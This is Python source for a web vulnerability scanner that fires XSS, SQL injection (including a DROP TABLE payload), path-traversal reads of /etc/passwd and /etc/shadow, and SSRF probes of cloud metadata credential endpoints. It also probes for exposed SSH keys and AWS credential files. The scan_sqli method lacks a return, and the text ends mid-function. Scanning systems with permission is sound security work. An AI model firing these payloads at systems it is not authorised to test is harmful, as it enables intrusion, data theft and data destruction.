"""
VulnScanner — active vulnerability checks.
Modules: XSS, SQLi, LFI, SSRF, Open Redirect, Security Headers.
"""

import threading
import time
import re
from urllib.parse import urlparse, urlencode, parse_qs, urljoin, urlunparse
from queue import Queue
from bs4 import BeautifulSoup

from modules.utils import (
    make_session, safe_get, safe_post, finding, log, Colors
)


# ── Payloads ──────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<svg onload=alert(1)>',
    '{{7*7}}',
    '${7*7}',
]

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    '" OR 1=1--',
    "' AND SLEEP(3)--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "'; WAITFOR DELAY '0:0:3'--",
]

SQLI_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "ora-01756",
    "unclosed quotation mark",
    "syntax error",
    "pg_query",
    "sqlite3",
    "microsoft sql server",
    "jdbc",
    "sqlstate",
    "sql server",
    "pdo",
    "you have an error in your sql",
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../windows/win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "C:\\Windows\\win.ini",
]

LFI_SIGNATURES = [
    "root:x:0:0",
    "[extensions]",
    "[boot loader]",
    "for 16-bit app support",
    "daemon:x:",
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/metadata/v1/",
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://127.1/",
]

SSRF_SIGNATURES = [
    "ami-id",
    "instance-id",
    "computeMetadata",
    "iam/security-credentials",
    "metadata",
]

SENSITIVE_PATTERNS = [
    ("AWS Access Key", re.compile(r"AKIA[0-9A-Z]{16}")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*[A-Za-z0-9/+=]{40}")),
    ("Private RSA Key", re.compile(r"-----BEGIN RSA PRIVATE KEY-----")),
    ("Private EC Key", re.compile(r"-----BEGIN EC PRIVATE KEY-----")),
    ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+")),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "https://evil.com%2F%2F",
    "/\\evil.com",
    "http://evil.com",
    "javascript:alert(1)",
]

REDIRECT_PARAMS = [
    "redirect", "redirect_to", "redirect_url", "return", "return_to",
    "returnUrl", "next", "url", "goto", "dest", "destination",
    "continue", "forward", "target", "redir", "r", "u",
]

CSRF_TOKEN_NAMES = {
    "csrf_token", "csrfmiddlewaretoken", "authenticity_token",
    "token", "csrf", "xsrf-token", "xsrf_token",
    "anti_csrf_token", "_csrf", "_token"
}

COMMON_DIRFUZZ_PATHS = [
    "admin/", "login/", "dashboard/", "config/", "backup/", "uploads/",
    "portal/", "server-status", "shell/", "wp-admin/", "wp-login.php",
    "phpmyadmin/", "vendor/", ".git/", ".env", ".gitignore",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Frame-Options": "medium",
    "X-Content-Type-Options": "medium",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "X-XSS-Protection": "low",
}

TAKEOVER_SIGNATURES = [
    "NoSuchBucket",
    "There isn't a GitHub Pages site here.",
    "Fastly error: unknown domain",
    "No such app",
    "The requested URL was not found on this server.",
    "A DNS leak or misconfiguration",
    "NoSuchDomain",
    "No such host",
]

CLICKJACKING_SAFE_DIRECTIVES = [
    "frame-ancestors 'none'",
    "frame-ancestors 'self'",
    "frame-ancestors https:",
]


# ── Scanner class ─────────────────────────────────────────────────────────────

class VulnScanner:
    def __init__(self, config: dict, recon_data: dict):
        self.config    = config
        self.recon     = recon_data
        self.timeout   = config.get("timeout", 10)
        self.threads   = config.get("threads", 10)
        self.verbose   = config.get("verbose", False)
        self.session   = make_session(config)
        self.findings  : list[dict] = []
        self._lock     = threading.Lock()
        self.seen_fingerprints: set = set()  # Track deduplicated findings by fingerprint

    # ── Helpers ───────────────────────────────────────────────────────────

    def _add(self, f: dict):
        """Thread-safe addition of findings with deduplication by fingerprint."""
        with self._lock:
            # Skip if we've already seen this exact finding (same type + url + evidence)
            fingerprint = f.get('fingerprint')
            if fingerprint and fingerprint in self.seen_fingerprints:
                return
            if fingerprint:
                self.seen_fingerprints.add(fingerprint)
            self.findings.append(f)

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replace a query param value with a payload."""
        try:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [payload]
            new_query = urlencode(qs, doseq=True)
            return urlunparse(parsed._replace(query=new_query))
        except Exception:
            return url

    def _urls_with_params(self) -> list[str]:
        """Get URLs that have query parameters."""
        return [u for u in self.recon.get("urls", []) if "?" in u]

    def _normalize_list(self, value):
        if value is None:
            return []
        if isinstance(value, str):
            return [item.strip() for item in value.split(",") if item.strip()]
        if isinstance(value, list):
            return value
        return [value]

    def _get_module_param(self, module_name, key, default=None):
        return self.config.get("module_params", {}).get(module_name, {}).get(key, default)

    def _get_target_scheme(self):
        return urlparse(self.config.get("target", "")).scheme.lower()

    def _same_origin(self, action_url: str) -> bool:
        target = urlparse(self.config.get("target", ""))
        action = urlparse(action_url)
        return action.netloc == "" or action.netloc == target.netloc

    def _in_scope(self, url: str) -> bool:
        """Check if URL is within scan scope based on include/exclude patterns."""
        parsed = urlparse(url)
        path = parsed.path + ("?" + parsed.query if parsed.query else "")
        
        # Check exclude patterns first (regex list)
        exclude_patterns = self.config.get("exclude_patterns", [])
        for pattern in exclude_patterns:
            try:
                if re.search(pattern, url, re.IGNORECASE):
                    return False
            except Exception:
                continue
        
        # Check include paths (if specified, only include matching paths)
        include_paths = self.config.get("include_paths", [])
        if include_paths:
            for pattern in include_paths:
                try:
                    if re.search(pattern, path, re.IGNORECASE):
                        return True
                except Exception:
                    continue
            return False  # If include_paths specified but no match, exclude
        
        # Default: in scope
        return True
    
    def _deduplicate(self, findings: list[dict]) -> list[dict]:
        """
        Deduplicate findings by grouping similar ones.
        If 5+ findings of same type on different URLs, collapse into one with URL list.
        """
        if not findings:
            return findings
        
        # Group by (type, extracted_param)
        groups = {}
        for f in findings:
            vuln_type = f.get('type', f.get('title', 'Unknown'))
            # Extract parameter name from evidence if possible
            evidence = f.get('evidence', '')
            param = ''
            if "Parameter '" in evidence:
                param = evidence.split("Parameter '")[1].split("'")[0]
            
            key = (vuln_type, param)
            if key not in groups:
                groups[key] = []
            groups[key].append(f)
        
        # Collapse groups with 5+ entries
        deduped = []
        for (vuln_type, param), group in groups.items():
            if len(group) >= 5:
                # Keep first finding, add grouped_urls field
                first = group[0].copy()
                grouped_urls = [f.get('url', '') for f in group]
                first['grouped_urls'] = grouped_urls
                first['details'] = f"Found on {len(group)} URLs with similar patterns"
                deduped.append(first)
            else:
                # Keep all individual findings
                deduped.extend(group)
        
        return deduped

    def _run_threaded(self, fn, items):
        """Execute function on items using thread pool."""
        q = Queue()
        results = []
        lock = threading.Lock()
        for item in items:
            q.put(item)

        def worker():
            while not q.empty():
                try:
                    item = q.get_nowait()
                except Exception:
                    return
                try:
                    result = fn(item)
                    if result:
                        with lock:
                            results.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    log(f"  [worker] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                q.task_done()

        ts = [threading.Thread(target=worker, daemon=True) for _ in range(self.threads)]
        for t in ts:
            t.start()
        for t in ts:
            t.join()
        return results

    # ── XSS ──────────────────────────────────────────────────────────────

    def scan_xss(self) -> list[dict]:
        """Scan for Reflected XSS via URL params and HTML forms."""
        findings = []

        # 1. Reflected XSS via URL query parameters
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in XSS_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp and payload in resp.text:
                                # If payload is reflected verbatim, mark as confirmed
                                confidence = "confirmed" if payload in resp.text else "probable"
                                f = finding(
                                    "Reflected XSS",
                                    test_url,
                                    "high",
                                    f"Parameter '{param}' reflects unsanitised payload",
                                    f"Payload: {payload[:100]}",
                                    confidence=confidence
                                )
                                self._add(f)
                                findings.append(f)
                                log(f"  [XSS] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception as e:
                            log(f"  [XSS] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [XSS] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        # 2. XSS via HTML form fields
        for form in self.recon.get("forms", []):
            try:
                form_action = form.get("action", "")
                if form_action and not self._in_scope(form_action):
                    continue
                    
                for field in form.get("fields", []):
                    if field.get("type") in ("hidden", "submit", "button"):
                        continue
                    for payload in XSS_PAYLOADS[:3]:
                        try:
                            data = {f["name"]: f.get("value", "test") for f in form.get("fields", [])}
                            data[field["name"]] = payload
                            
                            if form.get("method", "get").lower() == "post":
                                resp = safe_post(self.session, form.get("action", ""), data, self.timeout)
                            else:
                                form_url = form.get("action", "") + "?" + urlencode(data)
                                resp = safe_get(self.session, form_url, self.timeout)
                            
                            if resp and payload in resp.text:
                                confidence = "confirmed" if payload in resp.text else "probable"
                                f = finding(
                                    "Reflected XSS (Form)",
                                    form.get("action", ""),
                                    "high",
                                    f"Form field '{field['name']}' reflects unsanitised payload",
                                    f"Payload: {payload[:100]}",
                                    confidence=confidence
                                )
                                self._add(f)
                                findings.append(f)
                                break
                        except Exception as e:
                            log(f"  [XSS Form] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [XSS Form] Error processing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── SQLi ─────────────────────────────────────────────────────────────

    def scan_sqli(self) -> list[dict]:
        """Scan for SQL Injection (error-based and time-based blind)."""
        findings = []

        # 1. Error-based SQL injection
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in SQLI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                lower_body = resp.text.lower()
                                matched = [err for err in SQLI_ERRORS if err in lower_body]
                                if matched:
                                    # Error-based SQLi with 2+ error signatures = confirmed
                                    confidence = "confirmed" if len(matched) >= 2 else "probable"
                                    f = finding(
                                        "SQL Injection",
                                        test_url,
                                        "critical",
                                        f"Parameter '{param}' triggers SQL error: {matched[0]}",
                                        f"Payload: {payload[:100]}",
                                        confidence=confidence
                                    )
                                    self._add(f)
                                    findings.append(f)
                                    log(f"  [SQLi] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                    break
                        except Exception as e:
                            log(f"  [SQLi] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [SQLi] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        # 2. Boolean-based SQL injection
        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params[:2]:
                    try:
                        true_payload = "' OR '1'='1"
                        false_payload = "' OR '1'='2"
                        true_url = self._inject_param(url, param, true_payload)
                        false_url = self._inject_param(url, param, false_payload)

                        true_resp = safe_get(self.session, true_url, self.timeout)
                        false_resp = safe_get(self.session, false_url, self.timeout)

                        if true_resp and false_resp:
                            true_len = len(true_resp.text)
                            false_len = len(false_resp.text)
                            if false_len > 0 and abs(true_len - false_len) / false_len > 0.2:
                                f = finding(
                                    "Boolean-based SQL Injection",
                                    true_url,
                                    "critical",
                                    f"Parameter '{param}' returned significantly different responses for boolean payloads.",
                                    f"True payload: {true_payload}, False payload: {false_payload}",
                                    confidence="probable"
                                )
                                self._add(f)
                                findings.append(f)
                                log(f"  [SQLi Bool] {true_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                    except Exception as e:
                        log(f"  [SQLi Bool] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                        continue
            except Exception as e:
                log(f"  [SQLi Bool] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        # 3. Time-based blind SQL injection
        for url in self._urls_with_params():
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in ["' AND SLEEP(5)--", '" AND SLEEP(5)--', "1; WAITFOR DELAY '0:0:5'--"]:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout + 5)
                            if resp and resp.elapsed.total_seconds() >= 5:
                                f = finding(
                                    "Time-based Blind SQL Injection",
                                    test_url,
                                    "critical",
                                    f"Parameter '{param}' appears vulnerable to time-based SQL injection.",
                                    f"Payload: {payload}",
                                    impact="This indicates the backend is executing SQL that can be timed to infer database behavior.",
                                    recommendation="Use parameterized queries and avoid injecting user-controlled data into SQL statements."
                                )
                                self._add(f)
                                findings.append(f)
                                log(f"  [SQLi Time] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                break
                        except Exception as e:
                            log(f"  [SQLi Time] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [SQLi Time] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

    # ── LFI ──────────────────────────────────────────────────────────────

    def scan_lfi(self) -> list[dict]:
        """Scan for Local File Inclusion with path traversal payloads."""
        findings = []

        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                for param in params:
                    for payload in LFI_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                for sig in LFI_SIGNATURES:
                                    if sig in body:
                                        f = finding(
                                            "Local File Inclusion",
                                            test_url,
                                            "critical",
                                            f"Parameter '{param}' includes local file (signature: {sig!r})",
                                            f"Payload: {payload}",
                                            confidence="confirmed"
                                        )
                                        self._add(f)
                                        findings.append(f)
                                        log(f"  [LFI] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                        break
                        except Exception as e:
                            log(f"  [LFI] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [LFI] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── SSRF ─────────────────────────────────────────────────────────────

    def scan_ssrf(self) -> list[dict]:
        """
        Scan for Server-Side Request Forgery (AWS/GCP metadata, localhost).
        Uses multi-signature matching and response code validation to reduce false positives.
        """
        findings = []
        import hashlib

        for url in self._urls_with_params():
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                
                # Get baseline response
                baseline_resp = safe_get(self.session, url, self.timeout)
                baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest() if baseline_resp else None
                baseline_len = len(baseline_resp.text) if baseline_resp else 0
                
                for param in params:
                    found_ssrf = False
                    for payload in SSRF_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            if resp:
                                body = resp.text
                                # Count matching signatures (require 2+ signatures for confirmation)
                                matched_sigs = [sig for sig in SSRF_SIGNATURES if sig in body]
                                
                                # Check if response is meaningfully different from baseline
                                resp_hash = hashlib.md5(body.encode()).hexdigest()
                                resp_len = len(body)
                                is_different = (baseline_hash != resp_hash) or (abs(resp_len - baseline_len) > 100)
                                
                                # SSRF confirmed if: 2+ signatures OR 200 status with different response
                                if (len(matched_sigs) >= 2) or (resp.status_code == 200 and is_different and len(matched_sigs) >= 1):
                                    # 2+ signatures = confirmed, 1 signature = probable
                                    confidence = "confirmed" if len(matched_sigs) >= 2 else "probable"
                                    f = finding(
                                        "Server-Side Request Forgery (SSRF)",
                                        test_url,
                                        "critical",
                                        f"Parameter '{param}' may fetch internal resources ({len(matched_sigs)} signature(s))",
                                        f"Payload: {payload}, Signatures: {', '.join(matched_sigs[:3])}",
                                        confidence=confidence
                                    )
                                    self._add(f)
                                    findings.append(f)
                                    log(f"  [SSRF] {test_url[:80]}", Colors.RED, verbose_only=True, verbose=self.verbose)
                                    found_ssrf = True
                                    break
                        except Exception as e:
                            log(f"  [SSRF] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
                    
                    if found_ssrf:
                        break
            except Exception as e:
                log(f"  [SSRF] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Open Redirect ─────────────────────────────────────────────────────

    def scan_open_redirect(self) -> list[dict]:
        """
        Scan for Open Redirect vulnerabilities.
        Only tests parameters that are actually discovered in the URL.
        """
        findings = []
        urls = self.recon.get("urls", [])

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                parsed = urlparse(url)
                params = list(parse_qs(parsed.query).keys())
                
                # FIX: Only test redirect-like parameters that actually exist in the URL
                # Do NOT test hardcoded params on URLs that don't have them
                redirect_params = [p for p in params if p.lower() in REDIRECT_PARAMS]
                
                if not redirect_params:
                    # No redirect params found in this URL, skip it
                    continue

                for param in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        try:
                            test_url = self._inject_param(url, param, payload)
                            resp = safe_get(self.session, test_url, self.timeout)
                            
                            if resp:
                                final_url = resp.url if hasattr(resp, 'url') else ""
                                
                                # Check if evil.com is in final URL or redirect headers
                                if "evil.com" in final_url:
                                    f = finding(
                                        "Open Redirect",
                                        test_url,
                                        "medium",
                                        f"Parameter '{param}' redirects to external domain",
                                        f"Final URL: {final_url[:100]}",
                                        confidence="confirmed"
                                    )
                                    self._add(f)
                                    findings.append(f)
                                    log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                    break
                                
                                # Check response history for redirects
                                if hasattr(resp, 'history'):
                                    for h in resp.history:
                                        loc = h.headers.get("Location", "")
                                        if "evil.com" in loc:
                                            f = finding(
                                                "Open Redirect",
                                                test_url,
                                                "medium",
                                                f"Parameter '{param}' redirects to external domain",
                                                f"Redirect Location: {loc[:100]}",
                                                confidence="tentative"
                                            )
                                            self._add(f)
                                            findings.append(f)
                                            log(f"  [REDIRECT] {test_url[:80]}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
                                            break
                        except Exception as e:
                            log(f"  [REDIRECT] Error testing {param}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                            continue
            except Exception as e:
                log(f"  [REDIRECT] Error processing URL: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── CSRF ─────────────────────────────────────────────────────────────

    def scan_csrf(self) -> list[dict]:
        """Scan for forms that may be missing anti-CSRF protections."""
        findings = []

        for form in self.recon.get("forms", []):
            try:
                form_action = form.get("action", form.get("url", ""))
                if form_action and not self._in_scope(form_action):
                    continue
                    
                if form.get("method", "GET").upper() != "POST":
                    continue

                token_found = any(
                    f.get("name", "").lower() in CSRF_TOKEN_NAMES
                    for f in form.get("fields", [])
                )

                if not token_found:
                    action = form.get("action", form.get("url", ""))
                    f = finding(
                        "Missing CSRF Protection",
                        action,
                        "medium",
                        "POST form does not contain a known anti-CSRF token field.",
                        f"Form action: {action}",
                        confidence="confirmed"
                    )
                    self._add(f)
                    findings.append(f)
                    log(f"  [CSRF] {action}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [CSRF] Error analyzing form: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Directory Fuzzing ─────────────────────────────────────────────────

    def scan_directory_fuzz(self) -> list[dict]:
        """Scan for exposed common directories and filenames."""
        findings = []
        urls = self.recon.get("urls", [])

        if not urls:
            return findings

        base = urlparse(self.config.get("target", "")).netloc
        if not base:
            return findings

        paths = COMMON_DIRFUZZ_PATHS[:]
        custom_wordlist = self.config.get("wordlist")
        if custom_wordlist:
            try:
                with open(custom_wordlist, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and line not in paths:
                            paths.append(line)
            except Exception as e:
                log(f"  [DIRB] Failed to load wordlist {custom_wordlist}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        for path in paths:
            try:
                target_url = f"{self.config.get('target').rstrip('/')}/{path.lstrip('/')}"
                resp = safe_get(self.session, target_url, self.timeout, raise_for_status=False)
                if resp and resp.status_code == 200:
                    title = "Exposed Common Path"
                    details = f"Accessible path found: {target_url}"
                    if any(keyword in resp.text.lower() for keyword in ["index of /", "directory listing", "parent directory"]):
                        title = "Directory Listing Enabled"
                        details = f"Index listing detected at {target_url}"
                    f = finding(
                        title,
                        target_url,
                        "medium",
                        details,
                        f"HTTP {resp.status_code}"
                    )
                    self._add(f)
                    findings.append(f)
                    log(f"  [DIRB] {target_url}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [DIRB] Error testing {path}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Sensitive Data Exposure ────────────────────────────────────────────

    def scan_exposed_files(self) -> list[dict]:
        """
        Scan for commonly exposed sensitive files and configuration data.
        Probes for .env, .git config, backup archives, phpinfo, etc.
        """
        findings = []
        
        EXPOSED_FILES = [
            ".env",
            ".env.local",
            ".env.backup",
            "/.git/config",
            "/.gitignore",
            "/backup.zip",
            "/backup.tar.gz",
            "/backup.sql",
            "/phpinfo.php",
            "/wp-config.php",
            "/wp-config.php.bak",
            "/.DS_Store",
            "/web.config",
            "/web.config.bak",
            "/config.php",
            "/config.xml",
            "/.htaccess",
            "/.htpasswd",
            "/web.xml",
            "/pom.xml",
            "/.aws/credentials",
            "/.ssh/id_rsa",
            "/Dockerfile",
            "/.dockerignore",
            "/docker-compose.yml",
            "/secrets.txt",
            "/passwords.txt",
            "/.env.example",
        ]
        
        target_base = self.config.get("target", "").rstrip("/")
        
        for exposed_file in EXPOSED_FILES:
            try:
                file_url = target_base + exposed_file
                if not self._in_scope(file_url):
                    continue
                    
                resp = safe_get(self.session, file_url, self.timeout, raise_for_status=False)
                
                if resp and resp.status_code == 200:
                    severity = "critical"
                    details = f"Sensitive file is publicly accessible"
                    
                    # Assess severity based on file type
                    if ".env" in exposed_file or "config" in exposed_file.lower():
                        severity = "critical"
                        details = f"Configuration file containing potential secrets is accessible"
                    elif "backup" in exposed_file.lower():
                        severity = "high"
                        details = f"Backup archive is publicly accessible"
                    elif ".git" in exposed_file or ".DS_Store" in exposed_file:
                        severity = "high"
                        details = f"Version control metadata is exposed"
                    elif "phpinfo" in exposed_file:
                        severity = "high"
                        details = f"PHP information disclosure via phpinfo()"
                    elif ".ssh" in exposed_file or ".aws" in exposed_file:
                        severity = "critical"
                        details = f"Credentials file is publicly accessible"
                    
                    f = finding(
                        "Exposed Sensitive File",
                        file_url,
                        severity,
                        details,
                        f"HTTP {resp.status_code} - File size: {len(resp.text)} bytes",
                        confidence="confirmed"
                    )
                    self._add(f)
                    findings.append(f)
                    log(f"  [EXPOSED] {file_url}", Colors.RED, verbose_only=True, verbose=self.verbose)
            except Exception as e:
                log(f"  [EXPOSED] Error checking {exposed_file}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Sensitive Data Exposure ────────────────────────────────────────────

    def scan_sensitive_data(self) -> list[dict]:
        """Scan discovered pages for leaked credentials and sensitive tokens."""
        findings = []

        for url in self.recon.get("urls", []):
            try:
                resp = safe_get(self.session, url, self.timeout, raise_for_status=False)
                if not resp or not resp.text:
                    continue

                body = resp.text
                for label, pattern in SENSITIVE_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        f = finding(
                            f"Sensitive Data Exposure ({label})",
                            url,
                            "high" if "key" in label.lower() else "medium",
                            f"Potential sensitive value detected in page content: {label}.",
                            f"Matched: {match.group(0)[:120]}",
                            impact="Exposure of secrets or credentials can lead to account takeover or data loss.",
                            recommendation="Remove secrets from public pages and rotate any exposed credentials immediately."
                        )
                        self._add(f)
                        findings.append(f)
                        log(f"  [SENSITIVE] {url} - {label}", Colors.RED, verbose_only=True, verbose=self.verbose)
                        break
            except Exception as e:
                log(f"  [SENSITIVE] Error scanning {url}: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
                continue

        return findings

    # ── Security Headers ─────────────────────────────────────────────────

    def scan_headers(self) -> list[dict]:
        """Scan for missing security headers and version disclosure."""
        findings = []
        
        try:
            target = self.config.get("target", "")
            if not target:
                return findings
            
            resp = safe_get(self.session, target, self.timeout)
            if not resp:
                return findings

            # Check for missing security headers
            for header, severity in SECURITY_HEADERS.items():
                if header not in resp.headers:
                    f = finding(
                        "Missing Security Header",
                        target,
                        severity,
                        f"Response is missing the '{header}' header",
                        f"Headers present: {', '.join(list(resp.headers.keys())[:5])}",
                        confidence="confirmed"
                    )
                    self._add(f)
                    findings.append(f)

            # Check for overly verbose Server header (version disclosure)
            server = resp.headers.get("Server", "")
            if server and any(c.isdigit() for c in server):
                f = finding(
                    "Information Disclosure (Server Banner)",
                    target,
                    "low",
                    f"Server header reveals version: {server!r}",
                    "",
                    confidence="confirmed"
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] Server banner: {server}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Check for X-Powered-By (tech stack disclosure)
            x_powered = resp.headers.get("X-Powered-By", "")
            if x_powered:
                f = finding(
                    "Information Disclosure (X-Powered-By)",
                    target,
                    "low",
                    f"X-Powered-By reveals tech stack: {x_powered!r}",
                    "",
                    confidence="confirmed"
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] X-Powered-By: {x_powered}", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Check for X-AspNet-Version (ASP.NET version disclosure)
            aspnet = resp.headers.get("X-AspNet-Version", "")
            if aspnet:
                f = finding(
                    "Information Disclosure (X-AspNet-Version)",
                    target,
                    "low",
                    f"X-AspNet-Version reveals .NET version: {aspnet!r}",
                    ""
                )
                self._add(f)
                findings.append(f)

            # Warn when CSP is present but allows unsafe sources
            csp = resp.headers.get("Content-Security-Policy", "")
            if csp and any(token in csp.lower() for token in ["unsafe-inline", "unsafe-eval", "data:"]):
                f = finding(
                    "Weak Content Security Policy",
                    target,
                    "medium",
                    "CSP contains potentially unsafe directives.",
                    f"CSP: {csp[:200]}",
                    impact="Allows inline script execution and may enable XSS exploitation.",
                    recommendation="Use a strict CSP without unsafe-inline, unsafe-eval, or data: sources."
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] Weak CSP detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Check CORS configuration for overly permissive or credentialed wildcard origins
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acc = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == "*" and acc == "true":
                f = finding(
                    "Insecure CORS Configuration",
                    target,
                    "high",
                    "Access-Control-Allow-Origin is '*' while credentials are allowed.",
                    f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acc}",
                    impact="Allows attacker-controlled websites to perform credentialed requests.",
                    recommendation="Do not use '*' with credentials; restrict Access-Control-Allow-Origin to trusted origins."
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] Insecure CORS detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)
            elif acao == "*":
                f = finding(
                    "Overly Permissive CORS",
                    target,
                    "low",
                    "Access-Control-Allow-Origin is set to '*'.",
                    f"Access-Control-Allow-Origin: {acao}",
                    impact="Public resources may be accessible from any origin.",
                    recommendation="Restrict CORS to trusted origins where possible."
                )
                self._add(f)
                findings.append(f)
                log(f"  [HEADERS] Permissive CORS detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

            # Inspect Set-Cookie headers for missing secure and httponly flags
            cookie_headers = resp.headers.get("Set-Cookie", "")
            if cookie_headers:
                if "secure" not in cookie_headers.lower() or "httponly" not in cookie_headers.lower():
                    f = finding(
                        "Insecure Session Cookie",
                        target,
                        "medium",
                        "Set-Cookie header may be missing Secure and/or HttpOnly flags.",
                        f"Set-Cookie: {cookie_headers}",
                        impact="Cookies without Secure/HttpOnly are more vulnerable to theft and XSS.",
                        recommendation="Add Secure and HttpOnly flags to session cookies."
                    )
                    self._add(f)
                    findings.append(f)
                    log(f"  [HEADERS] Insecure cookies detected", Colors.YELLOW, verbose_only=True, verbose=self.verbose)

        except Exception as e:
            log(f"  [HEADERS] Error scanning headers: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return findings

    # ── Clickjacking / Frame Options ─────────────────────────────────────────────

    def scan_clickjacking(self) -> list[dict]:
        """Scan for clickjacking exposure and missing frame protection."""
        findings = []
        target = self.config.get("target", "")
        try:
